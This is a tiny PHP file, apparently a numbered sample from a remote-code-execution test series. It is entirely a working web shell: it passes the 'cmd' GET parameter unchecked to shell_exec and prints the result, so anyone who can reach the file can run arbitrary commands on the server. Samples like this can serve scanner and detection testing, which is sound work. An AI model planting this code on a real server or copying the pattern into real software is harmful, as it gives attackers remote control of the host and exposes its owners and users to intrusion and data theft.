<?php
// RCE test variation #930
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>